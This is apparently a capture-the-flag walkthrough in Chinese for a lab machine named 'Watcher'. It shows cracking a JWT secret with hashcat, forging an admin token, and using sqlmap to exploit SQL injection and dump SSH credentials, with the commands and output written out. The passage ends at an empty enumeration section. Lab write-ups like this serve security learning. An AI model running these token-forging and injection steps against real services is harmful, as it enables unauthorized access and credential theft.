
```table-of-contents
```

# 信息收集

基本的主机发现、端口与服务探测、默认脚本
只发现两个端口：22，5000
5000端口的服务为：Gunicorn（这是一个**纯Python实现的WSGI服务器**）

基本的探测没有直接可用的内容，那就先从服务出手

![](assets/Watcher/file-20260605162835853.png)
检查了一下网页源代码，不存在重要的信息泄露
那么就尝试进行注册、探测一下可能的立足点功能

![](assets/Watcher/file-20260605163050839.png)
能找到的可能作为立足点的内容就是这个系统管理功能
至少创建的普通用户权限不足以访问该功能

初步的信息收集到此为止：主要点就是从服务的系统管理功能出发，想办法绕过权限限制

# 权限绕过

既然涉及到权限的绕过，那么就先从抓包入手
![](assets/Watcher/file-20260605163509789.png)
很明显存在JWT的验证

![](assets/Watcher/file-20260605163641056.png)
直接可以解码获得`username` 、`level`
根据报错显示，需要将`normal`改为`admin`
但存在一个问题：对称密码并不知道（处理从信息收集而来就是爆破手段了，这里可以猜测为：maze 或 相关的内容）
为了更加准确就进行爆破（hashcat）
```zsh
hashcat -m 16500 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkZpbmlzIiwibGV2ZWwiOiJub3JtYWwiLCJpYXQiOjE3ODA2NDg0ODksImV4cCI6MTc4MDY1MjA4OX0.kWmf9f7m9UHnYTVrMrS304MY0-29j5jUj5hfjkBnEgk:maze
```
很明显对称密码为：maze

![](assets/Watcher/file-20260605164449069.png)
将要修改的修改后进行编码
在浏览器中修改Cookie的值（为了多次尝试，探测漏洞点更加方便）
![](assets/Watcher/file-20260605164429869.png)

# 立足点（Shell）

越权成功了，但是经过对系统管理模块功能的探测没有发现明显的利用点
依旧是先尝试抓包，判断该功能是否只是纯前端的实现吧！

![](assets/Watcher/file-20260605164822008.png)
看来是有请求发送的，只是没有实现对应的详细功能而已

现在拿到请求包，理由有两个参数是可以修改尝试的
![](assets/Watcher/file-20260605165006242.png)
经过多种符号等尝试，这里出现报错： **数据库的语法有错误（也就是说这里可能存在SQL注入），结合：syntax eroor可以推测出这是SQLite的语法报错（那就尝试进行SQLite的语法注入，当然用sqlmap也是可行的）** --- 这里判断出是SQLite的语法错误使用sqlmap时也可针对性的构建指令

```zsh
sqlmap -r req.txt --tables --batch --level 5 --risk 3 --threads 5
<current>
[4 tables]
+-----------------+
| secret          |
| settings        |
| sqlite_sequence |
| users           |
+-----------------+

sqlmap -r req.txt -T secret --dump --batch --level 5 --risk 3 --threads 5
[09:25:00] [INFO] retrieved: 1
[09:25:00] [INFO] retrieving the length of query output
[09:25:00] [INFO] retrieved: 32
[09:25:01] [INFO] retrieved: watcher:mazesec123q1231w!@#!@@#$             
Database: <current>
Table: secret
[1 entry]
+----+----------------------------------+
| id | secret                           |
+----+----------------------------------+
| 1  | watcher:mazesec123q1231w!@#!@@#$ |
+----+----------------------------------+

```
成功使用sqlmap跑出了一对凭证

登录SSH --- 成功拿到尝试立足点

# 信息枚举

